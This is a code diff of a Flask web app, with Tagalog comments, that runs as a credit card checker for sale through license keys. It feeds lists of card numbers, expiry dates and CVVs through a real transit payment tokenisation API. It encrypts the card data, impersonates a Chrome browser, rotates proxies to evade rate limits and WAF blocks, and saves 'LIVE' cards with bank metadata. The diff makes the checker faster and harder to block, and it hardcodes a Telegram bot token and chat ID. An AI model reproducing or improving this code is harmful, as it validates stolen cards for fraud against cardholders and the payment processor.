@@ -29,18 +29,15 @@ DB_FILE = 'keys.json'
 CONFIG_FILE = 'config.json'
 LIVE_FILE = 'live.txt'
 
-# Palitan ang "admin123" dito o gamitin ang Change Password sa Admin Panel
 DEFAULT_ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "admin123")
-
 DEFAULT_TG_TOKEN = "9138065167:AAHG3HmeQ8a_v7jiuUVqECR-m2W7Xc14fqg"
 DEFAULT_TG_CHAT = "6516330870"
-
-# Idle threshold in seconds bago mag-auto-pause ang key kapag walang heartbeat
 IDLE_PAUSE_THRESHOLD = 20
 
 checker_queue = queue.Queue()
 checker_stop_event = threading.Event()
 db_lock = threading.Lock()
+bin_server_cache = {}
 
 def load_config():
     if not os.path.exists(CONFIG_FILE):
@@ -82,8 +79,8 @@ def send_telegram_alert(token, chat_id, message):
     try:
         req = urllib.request.Request(url, data=payload, headers={'Content-Type': 'application/json'})
         urllib.request.urlopen(req, timeout=5)
-    except Exception as e:
-        print(f"Telegram Error: {e}")
+    except Exception:
+        pass
 
 def load_db():
     if not os.path.exists(DB_FILE):
@@ -118,27 +115,18 @@ def calculate_duration_seconds(amount, unit):
         return None
 
 def sync_key_usage(key_info, now_ts, active_ping=False, force_pause=False):
-    """
-    Nagka-calculate ng remaining_seconds base sa active usage.
-    - Kung hindi pa redeemed (`redeemed == False`), hindi gagalaw ang `remaining_seconds`.
-    - Kung redeemed at may recent ping within IDLE_PAUSE_THRESHOLD, ibabawas ang elapsed seconds.
-    - Kapag lumampas sa IDLE_PAUSE_THRESHOLD nang walang ping, auto-paused ang oras.
-    """
-    # Legacy migration kung dating expires_ts ang nakasave sa keys.json
     if "remaining_seconds" not in key_info:
         exp_ts = key_info.get("expires_ts")
         if exp_ts is None:
             key_info["remaining_seconds"] = None
         else:
-            rem = max(0, int(exp_ts - now_ts))
-            key_info["remaining_seconds"] = rem
+            key_info["remaining_seconds"] = max(0, int(exp_ts - now_ts))
         key_info["redeemed"] = bool(key_info.get("device_id"))
         key_info["is_paused"] = True
         key_info["last_active_ts"] = None
 
     rem_sec = key_info.get("remaining_seconds")
     if rem_sec is None:
-        # Lifetime key
         if active_ping:
             key_info["redeemed"] = True
             key_info["is_paused"] = False
@@ -152,14 +140,12 @@ def sync_key_usage(key_info, now_ts, active_ping=False, force_pause=False):
                 key_info["is_paused"] = True
         return key_info
 
-    # Kung hindi pa na-reredeem at hindi ito active ping mula sa checker
     if not key_info.get("redeemed", False) and not active_ping:
         key_info["is_paused"] = True
         key_info["last_active_ts"] = None
         return key_info
 
     last_ts = key_info.get("last_active_ts")
-
     if last_ts is not None and not key_info.get("is_paused", True):
         delta = now_ts - last_ts
         if 0 < delta <= IDLE_PAUSE_THRESHOLD:
@@ -167,7 +153,6 @@ def sync_key_usage(key_info, now_ts, active_ping=False, force_pause=False):
             key_info["remaining_seconds"] = rem_sec
             key_info["last_active_ts"] = now_ts
         elif delta > IDLE_PAUSE_THRESHOLD:
-            # Lumampas sa threshold dahil sinara ang tab o nawalan ng net -> Auto-pause
             key_info["is_paused"] = True
             key_info["last_active_ts"] = None
 
@@ -233,8 +218,7 @@ def checker_page():
 def api_login():
     data = request.get_json() or {}
     cfg = load_config()
-    current_admin_pw = cfg.get("admin_password", DEFAULT_ADMIN_PASSWORD)
-    if data.get('password') == current_admin_pw:
+    if data.get('password') == cfg.get("admin_password", DEFAULT_ADMIN_PASSWORD):
         return jsonify({"success": True})
     return jsonify({"success": False, "message": "Incorrect password!"})
 
@@ -260,11 +244,13 @@ def change_admin_password():
 def handle_config():
     if request.method == 'GET':
         cfg = load_config()
-        safe_cfg = {
-            "live_tg_token": cfg.get("live_tg_token", ""),
-            "live_tg_chat": cfg.get("live_tg_chat", "")
-        }
-        return jsonify({"success": True, "config": safe_cfg})
+        return jsonify({
+            "success": True,
+            "config": {
+                "live_tg_token": cfg.get("live_tg_token", ""),
+                "live_tg_chat": cfg.get("live_tg_chat", "")
+            }
+        })
     elif request.method == 'POST':
         data = request.get_json() or {}
         cfg = load_config()
@@ -276,38 +262,45 @@ def handle_config():
 @app.route('/api/bin/<bin_code>')
 def api_bin_lookup(bin_code):
     bin_code = bin_code.strip()[:6]
+    if bin_code in bin_server_cache:
+        return jsonify(bin_server_cache[bin_code])
+
     try:
-        r = requests.get(f"https://api.bincheck.io/v1/{bin_code}", timeout=5)
+        r = requests.get(f"https://api.bincheck.io/v1/{bin_code}", timeout=3)
         if r.status_code == 200:
             data = r.json()
             if data and data.get("success"):
                 bank_name = data.get("bank", {}).get("name")
                 country_name = data.get('country', {}).get('name')
                 if bank_name and country_name:
-                    return jsonify({
+                    res_obj = {
                         "success": True,
                         "scheme": (data.get("scheme") or "UNKNOWN").upper(),
                         "type": (data.get("type") or "").upper(),
                         "country": f"{data.get('country', {}).get('emoji', '')} {country_name}",
                         "bank": bank_name
-                    })
+                    }
+                    bin_server_cache[bin_code] = res_obj
+                    return jsonify(res_obj)
     except Exception:
         pass
 
     try:
-        r2 = requests.get(f"https://lookup.binlist.net/{bin_code}", headers={'Accept-Version': '3'}, timeout=5)
+        r2 = requests.get(f"https://lookup.binlist.net/{bin_code}", headers={'Accept-Version': '3'}, timeout=3)
         if r2.status_code == 200:
             data2 = r2.json()
             bank_info = data2.get("bank", {})
             country_info = data2.get("country", {})
             if bank_info.get("name") and country_info.get("name"):
-                return jsonify({
+                res_obj = {
                     "success": True,
                     "scheme": (data2.get("scheme") or "UNKNOWN").upper(),
                     "type": (data2.get("type") or "").upper(),
                     "country": f"{country_info.get('emoji', '')} {country_info.get('name', 'Unknown')}",
                     "bank": bank_info.get("name", "Unknown Bank")
-                })
+                }
+                bin_server_cache[bin_code] = res_obj
+                return jsonify(res_obj)
     except Exception:
         pass
 
@@ -323,20 +316,14 @@ def handle_keys():
             result = []
             for key, info in keys_data.items():
                 sync_key_usage(info, now_ts, active_ping=False)
-                rem_sec = info.get('remaining_seconds')
-                redeemed = info.get('redeemed', False)
-                is_paused = info.get('is_paused', True)
-                status = info.get('status', 'active')
-
                 result.append({
                     "key": key,
-                    "remaining_seconds": rem_sec,
-                    "redeemed": redeemed,
-                    "is_paused": is_paused,
-                    "status": status,
+                    "remaining_seconds": info.get('remaining_seconds'),
+                    "redeemed": info.get('redeemed', False),
+                    "is_paused": info.get('is_paused', True),
+                    "status": info.get('status', 'active'),
                     "device_id": info.get('device_id', '')
                 })
-
             save_db(keys_data)
             return jsonify({"success": True, "keys": result})
 
@@ -514,13 +501,30 @@ class WebProxyPool:
         return {"http": p, "https": p}
 
 class DynamicTokenManager:
+    """
+    CACHED TOKEN & PUBLIC KEYS MANAGER:
+    Hindi na nagla-lock at nagre-request sa bawat card.
+    Nagre-refresh lang kapag nag-expire ang TTL (45 seconds) o kapag nag-401.
+    """
     def __init__(self, initial_token, proxy_pool):
         self.token = initial_token
         self.proxy_pool = proxy_pool
         self.lock = threading.Lock()
+        self.last_refresh = 0
+        self.token_ttl = 45
+        self.cached_pub_keys = []
+        self.last_keys_fetch = 0
 
-    def get_token(self):
+    def get_token(self, force_refresh=False):
+        now = time.time()
+        if not force_refresh and (now - self.last_refresh) < self.token_ttl:
+            return self.token
+
         with self.lock:
+            now = time.time()
+            if not force_refresh and (now - self.last_refresh) < self.token_ttl:
+                return self.token
+
             url = f"{TOKENISATION_BASE}/api/v1/customer/tokens/request-token"
             headers = {
                 "Authorization": f"Bearer {self.token}",
@@ -533,20 +537,69 @@ class DynamicTokenManager:
             p_dict = self.proxy_pool.next() if self.proxy_pool else None
             proxy_str = p_dict["http"] if p_dict else None
             try:
-                session = cffi_requests.Session(impersonate="chrome")
-                resp = session.post(url, json=body, headers=headers, proxy=proxy_str, timeout=10, verify=False)
-                if resp.status_code == 200:
-                    data = resp.json()
-                    new_token = data.get("access_token")
-                    if new_token:
-                        self.token = new_token
+                with cffi_requests.Session(impersonate="chrome") as session:
+                    resp = session.post(url, json=body, headers=headers, proxy=proxy_str, timeout=8, verify=False)
+                    if resp.status_code == 200:
+                        data = resp.json()
+                        new_token = data.get("access_token")
+                        if new_token:
+                            self.token = new_token
+                            self.last_refresh = time.time()
             except Exception:
                 pass
+            if self.last_refresh == 0:
+                self.last_refresh = time.time()
             return self.token
+
+    def get_public_keys(self, proxy_str=None):
+        now = time.time()
+        if self.cached_pub_keys and (now - self.last_keys_fetch) < 60:
+            return self.cached_pub_keys
+
+        with self.lock:
+            now = time.time()
+            if self.cached_pub_keys and (now - self.last_keys_fetch) < 60:
+                return self.cached_pub_keys
+
+            current_token = self.get_token()
+            headers = {
+                "Authorization": f"Bearer {current_token}",
+                "Accept": "application/json, text/plain, */*",
+                "Origin": "https://coastrta.littlepay.com",
+                "Referer": "https://coastrta.littlepay.com/"
+            }
+            try:
+                with cffi_requests.Session(impersonate="chrome") as session:
+                    r = session.get(
+                        f"{TOKENISATION_BASE}/api/v1/tokenisation/public-keys",
+                        headers=headers,
+                        proxy=proxy_str,
+                        timeout=8,
+                        verify=False
+                    )
+                    if r.status_code == 401:
+                        current_token = self.get_token(force_refresh=True)
+                        headers["Authorization"] = f"Bearer {current_token}"
+                        r = session.get(
+                            f"{TOKENISATION_BASE}/api/v1/tokenisation/public-keys",
+                            headers=headers,
+                            proxy=proxy_str,
+                            timeout=8,
+                            verify=False
+                        )
+                    if r.status_code == 200:
+                        keys = r.json().get("list", [])
+                        if keys:
+                            self.cached_pub_keys = keys
+                            self.last_keys_fetch = time.time()
+                            return keys
+            except Exception:
+                pass
+            return self.cached_pub_keys
 
 def test_proxy(proxy_dict):
     try:
-        r = requests.get("https://api.ipify.org?format=json", proxies=proxy_dict, timeout=5, verify=False)
+        r = requests.get("https://api.ipify.org?format=json", proxies=proxy_dict, timeout=4, verify=False)
         return r.status_code == 200
     except Exception:
         return False
@@ -601,8 +654,7 @@ def create_native_jwe(plaintext: str, key_entry: dict) -> str:
     h = hmac.new(mac_key, hmac_input, hashlib.sha256).digest()
     tag = h[:16]
     
-    jwe_token = f"{protected_b64}.{b64url(encrypted_key)}.{b64url(iv)}.{b64url(ciphertext)}.{b64url(tag)}"
-    return jwe_token
+    return f"{protected_b64}.{b64url(encrypted_key)}.{b64url(iv)}.{b64url(ciphertext)}.{b64url(tag)}"
 
 def check_single_card(card_line, proxy_pool, token_manager):
     parts = card_line.split("|")
@@ -614,82 +666,111 @@ def check_single_card(card_line, proxy_pool, token_manager):
     expiry = f"{mo}/{yr[-2:]}"
     card_type = "visa" if cc.startswith("4") else "mastercard"
 
-    session = cffi_requests.Session(impersonate="chrome")
     p_dict = proxy_pool.next() if proxy_pool else None
     proxy_str = p_dict["http"] if p_dict else None
 
-    current_token = token_manager.get_token()
-
-    headers = {
-        "Authorization": f"Bearer {current_token}",
-        "Accept": "application/json, text/plain, */*",
-        "Accept-Language": "en-US,en;q=0.9",
-        "Origin": "https://coastrta.littlepay.com",
-        "Referer": "https://coastrta.littlepay.com/",
-        "Sec-Fetch-Dest": "empty",
-        "Sec-Fetch-Mode": "cors",
-        "Sec-Fetch-Site": "cross-site",
-    }
-
     try:
-        r = session.get(f"{TOKENISATION_BASE}/api/v1/tokenisation/public-keys", 
-                        headers=headers, 
-                        proxy=proxy_str, timeout=10, verify=False)
-        if r.status_code != 200:
-            return 2, "ERROR", f"HTTP {r.status_code} (Cloudflare 403 / WAF Block)"
-        
-        keys = r.json().get("list", [])
+        keys = token_manager.get_public_keys(proxy_str=proxy_str)
         if not keys:
-            return 2, "ERROR", "No public keys"
+            return 2, "ERROR", "Failed to fetch gateway public keys (Rate Limited / WAF)"
         key_entry = random.choice(keys)
 
         payload = {"ch_name": "", "cc_num": cc, "card_type": card_type, "card_date": expiry, "ch_country": "US"}
-        if cvv: payload["card_cvv"] = cvv
+        if cvv:
+            payload["card_cvv"] = cvv
 
         jwe_token = create_native_jwe(json.dumps(payload, separators=(",", ":")), key_entry)
+        current_token = token_manager.get_token()
 
+        headers = {
+            "Authorization": f"Bearer {current_token}",
+            "Accept": "application/json, text/plain, */*",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Origin": "https://coastrta.littlepay.com",
+            "Referer": "https://coastrta.littlepay.com/",
+            "Sec-Fetch-Dest": "empty",
+            "Sec-Fetch-Mode": "cors",
+            "Sec-Fetch-Site": "cross-site",
+        }
         auth_headers = headers.copy()
         auth_headers["Content-Type"] = "application/json"
 
-        r2 = session.post(f"{TOKENISATION_BASE}/api/v1/tokenisation/authenticate",
-                          headers=auth_headers,
-                          json={"key_id": key_entry["id"], "encrypted_payment_data": jwe_token, "payment_token_type": "CARD_DATA", "save_card": False},
-                          proxy=proxy_str, timeout=10, verify=False)
-        
-        try:
-            res_data = r2.json()
-        except Exception:
-            res_data = {"status": "ERROR"}
+        with cffi_requests.Session(impersonate="chrome") as session:
+            r2 = session.post(
+                f"{TOKENISATION_BASE}/api/v1/tokenisation/authenticate",
+                headers=auth_headers,
+                json={
+                    "key_id": key_entry["id"],
+                    "encrypted_payment_data": jwe_token,
+                    "payment_token_type": "CARD_DATA",
+                    "save_card": False
+                },
+                proxy=proxy_str,
+                timeout=10,
+                verify=False
+            )
 
-        status = str(res_data.get("status") or res_data.get("state") or "").upper()
-        if status in ("FAILED", "DECLINED", "REJECTED", "ERROR", "UNAUTHENTICATED"):
-            return 1, "DEAD", f"CARD_DECLINED ({status})"
-        
-        auth_id = res_data.get("authentication_id")
-        if not auth_id:
-            return 1, "DEAD", "CARD_DECLINED"
+            if r2.status_code == 401:
+                current_token = token_manager.get_token(force_refresh=True)
+                auth_headers["Authorization"] = f"Bearer {current_token}"
+                headers["Authorization"] = f"Bearer {current_token}"
+                r2 = session.post(
+                    f"{TOKENISATION_BASE}/api/v1/tokenisation/authenticate",
+                    headers=auth_headers,
+                    json={
+                        "key_id": key_entry["id"],
+                        "encrypted_payment_data": jwe_token,
+                        "payment_token_type": "CARD_DATA",
+                        "save_card": False
+                    },
+                    proxy=proxy_str,
+                    timeout=10,
+                    verify=False
+                )
 
-        r3 = session.get(f"{TOKENISATION_BASE}/api/v1/tokenisation/authenticate/{auth_id}",
-                       headers=headers,
-                       proxy=proxy_str, timeout=10, verify=False)
-        
-        try:
-            tok_data = r3.json()
-        except Exception:
-            tok_data = {}
+            if r2.status_code == 429:
+                return 2, "ERROR", "HTTP 429 Rate Limited (Use Proxies or Lower Threads)"
+            if r2.status_code == 403:
+                return 2, "ERROR", "HTTP 403 Cloudflare / WAF Block"
 
-        tok_status = str(tok_data.get("status") or tok_data.get("state") or "").upper()
-        if tok_status in ("FAILED", "DECLINED", "REJECTED", "ERROR"):
-            return 1, "DEAD", f"CARD_DECLINED ({tok_status})"
+            try:
+                res_data = r2.json()
+            except Exception:
+                res_data = {"status": f"HTTP_{r2.status_code}"}
 
-        if tok_data.get("authenticated_payment_token"):
-            return 0, "LIVE", "APPROVED"
-        
-        return 1, "DEAD", "DECLINED"
+            status = str(res_data.get("status") or res_data.get("state") or "").upper()
+            if status in ("FAILED", "DECLINED", "REJECTED", "ERROR", "UNAUTHENTICATED"):
+                return 1, "DEAD", f"CARD_DECLINED ({status})"
+            
+            auth_id = res_data.get("authentication_id")
+            if not auth_id:
+                return 1, "DEAD", f"DECLINED ({status or r2.status_code})"
+
+            r3 = session.get(
+                f"{TOKENISATION_BASE}/api/v1/tokenisation/authenticate/{auth_id}",
+                headers=headers,
+                proxy=proxy_str,
+                timeout=10,
+                verify=False
+            )
+            
+            try:
+                tok_data = r3.json()
+            except Exception:
+                tok_data = {}
+
+            tok_status = str(tok_data.get("status") or tok_data.get("state") or "").upper()
+            if tok_status in ("FAILED", "DECLINED", "REJECTED", "ERROR"):
+                return 1, "DEAD", f"CARD_DECLINED ({tok_status})"
+
+            if tok_data.get("authenticated_payment_token"):
+                return 0, "LIVE", "APPROVED"
+            
+            return 1, "DEAD", "DECLINED"
 
     except Exception as e:
         err_msg = str(e).encode('ascii', 'ignore').decode('ascii')
-        return 2, "ERROR", err_msg or "Exception"
+        return 2, "ERROR", err_msg[:80] if err_msg else "Request Timeout"
 
 def background_worker(cards, proxies_list, max_threads):
     raw_pool = WebProxyPool(proxies_list)
@@ -698,25 +779,32 @@ def background_worker(cards, proxies_list, max_threads):
 
     if total_proxies > 0:
         checker_queue.put({"status_msg": f"Testing {total_proxies} proxy/proxies..."})
-        for p_str in raw_pool.proxies:
-            p = p_str
-            if "://" not in p:
-                parts = p.split(":")
-                if len(parts) == 2:
-                    p = f"http://{parts[0]}:{parts[1]}"
-                elif len(parts) == 4:
-                    h, po, u, pw = parts
-                    safe_pw = urllib.parse.quote(pw, safe='')
-                    p = f"http://{u}:{safe_pw}@{h}:{po}"
-            p_dict = {"http": p, "https": p}
-            if test_proxy(p_dict):
-                valid_proxies.append(p_str)
-        
+        with ThreadPoolExecutor(max_workers=min(20, total_proxies)) as p_exec:
+            future_to_proxy = {}
+            for p_str in raw_pool.proxies:
+                p = p_str
+                if "://" not in p:
+                    parts = p.split(":")
+                    if len(parts) == 2:
+                        p = f"http://{parts[0]}:{parts[1]}"
+                    elif len(parts) == 4:
+                        h, po, u, pw = parts
+                        safe_pw = urllib.parse.quote(pw, safe='')
+                        p = f"http://{u}:{safe_pw}@{h}:{po}"
+                p_dict = {"http": p, "https": p}
+                future_to_proxy[p_exec.submit(test_proxy, p_dict)] = p_str
+
+            for fut in as_completed(future_to_proxy):
+                if fut.result():
+                    valid_proxies.append(future_to_proxy[fut])
+
         proxy_pool = WebProxyPool(valid_proxies) if valid_proxies else None
         checker_queue.put({"status_msg": f"Proxy check complete: {len(valid_proxies)}/{total_proxies} active. Starting threads..."})
     else:
         proxy_pool = None
-        checker_queue.put({"status_msg": "Running in multi-threaded proxyless mode..."})
+        # Kapag proxyless, nililimitahan sa max 5 threads para hindi ma-rate-limit o ma-hang ang IP
+        max_threads = min(max_threads, 5)
+        checker_queue.put({"status_msg": f"Running in proxyless mode ({max_threads} threads active)..."})
 
     token_manager = DynamicTokenManager(FALLBACK_BEARER_TOKEN, proxy_pool)
     counts = {"checked": 0, "live": 0, "dead": 0, "error": 0, "total": len(cards)}
@@ -728,25 +816,16 @@ def background_worker(cards, proxies_list, max_threads):
         
         code, status, detail = check_single_card(card, proxy_pool, token_manager)
         
+        if checker_stop_event.is_set():
+            return
+
         with counts_lock:
             counts["checked"] += 1
             if code == 0:
                 counts["live"] += 1
                 bin_code = card.split("|")[0].strip()[:6]
-                bin_meta = {}
-                try:
-                    b_res = requests.get(f"https://api.bincheck.io/v1/{bin_code}", timeout=3).json()
-                    if b_res and b_res.get("success"):
-                        bin_meta = {
-                            "scheme": (b_res.get("scheme") or "VISA/MC").upper(),
-                            "type": (b_res.get("type") or "CREDIT").upper(),
-                            "bank": b_res.get("bank", {}).get("name", "Unknown Bank"),
-                            "country": f"{b_res.get('country', {}).get('emoji', '')} {b_res.get('country', {}).get('name', 'Unknown')}"
-                        }
-                except Exception:
-                    pass
+                bin_meta = bin_server_cache.get(bin_code, {})
                 save_live_card(card, detail, bin_meta)
-
             elif code == 1:
                 counts["dead"] += 1
             else:
@@ -762,7 +841,7 @@ def background_worker(cards, proxies_list, max_threads):
 
     with ThreadPoolExecutor(max_workers=max_threads) as executor:
         futures = [executor.submit(worker_task, card) for card in cards]
-        for future in as_completed(futures):
+        for _ in as_completed(futures):
             if checker_stop_event.is_set():
                 break
 
@@ -773,8 +852,10 @@ def api_checker_start():
     global checker_queue, checker_stop_event
     checker_stop_event.set()
     while not checker_queue.empty():
-        try: checker_queue.get_nowait()
-        except Exception: pass
+        try:
+            checker_queue.get_nowait()
+        except Exception:
+            break
 
     checker_stop_event = threading.Event()
     data = request.get_json() or {}
@@ -783,9 +864,9 @@ def api_checker_start():
     proxies = [p.strip() for p in data.get('proxies', '').split('\n') if p.strip()]
     
     try:
-        threads_val = int(data.get('threads', 15))
+        threads_val = max(1, min(50, int(data.get('threads', 10))))
     except ValueError:
-        threads_val = 15
+        threads_val = 10
 
     if not cards:
         return jsonify({"success": False, "message": "No cards provided"}), 400
@@ -803,13 +884,19 @@ def api_checker_stream():
     def event_stream():
         while not checker_stop_event.is_set():
             try:
-                data = checker_queue.get(timeout=1.0)
+                data = checker_queue.get(timeout=2.0)
                 yield f"data: {json.dumps(data)}\n\n"
                 if data.get("finished"):
                     break
             except queue.Empty:
-                continue
-    return Response(event_stream(), mimetype="text/event-stream")
+                # SSE keepalive ping every 2 seconds para hindi patayin ng Gunicorn/Cloudflare ang stream
+                yield ": keepalive\n\n"
+    headers = {
+        "Cache-Control": "no-cache",
+        "X-Accel-Buffering": "no",
+        "Connection": "keep-alive"
+    }
+    return Response(event_stream(), mimetype="text/event-stream", headers=headers)
 
 @app.route('/api/checker/export')
 def api_checker_export():
@@ -819,4 +906,4 @@ def api_checker_export():
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port)
+    app.run(host='0.0.0.0', port=port, threaded=True)
